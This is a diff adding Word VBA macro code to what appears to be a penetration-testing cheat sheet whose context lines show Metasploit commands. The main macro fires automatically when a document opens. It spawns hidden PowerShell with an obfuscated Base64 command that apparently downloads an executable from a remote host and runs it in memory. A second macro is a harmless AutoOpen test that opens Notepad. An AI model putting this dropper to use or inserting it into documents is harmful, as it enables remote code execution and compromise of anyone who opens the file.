@@ -27,3 +27,44 @@ use 0
 set session x
 exploit
 ```
+```
+Sub Document_Open()
+    test
+End Sub
+
+Sub AutoOpen()
+    test
+End Sub
+
+Function test()
+    Const HIDDEN_WINDOW = 12
+
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:" _
+        & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+
+    Set objConfig = objStartup.SpawnInstance_
+    objConfig.ShowWindow = HIDDEN_WINDOW
+    
+    Dim proc As Object
+    Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+    Dim str As String
+    
+    str = "powershell -exec bypass -nologo -nop -w hidden -enc " & _
+    "IABpAGUAeAAoAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAwAC4AMQAzADEAOgA5ADkAOQA5AC8AcwB1AHAAcABv" & _
+    "AHIAdAAuAGUAeABlACcAKQApACkALgBFAG4AdAByAHkAUABvAGkAbgB0AC4ASQBuAHYAbwBrAGUAKAAkAG4AdQBsAGwALAAgAFsATwBiAGoAZQBjAHQAWwBdAF0AQAAoAEAAKAAsACgAWwBTAHQAcgBpAG4AZwBbAF0AXQBAACgAKQApACkAKQApAA=="
+    
+    errReturn = proc.Create(str, Null, objConfig, intProcessID)
+End Function
+
+```
+```
+Sub AutoOpen()
+
+  Dim Shell As Object
+  Set Shell = CreateObject("wscript.shell")
+  Shell.Run "notepad"
+
+End Sub
+```
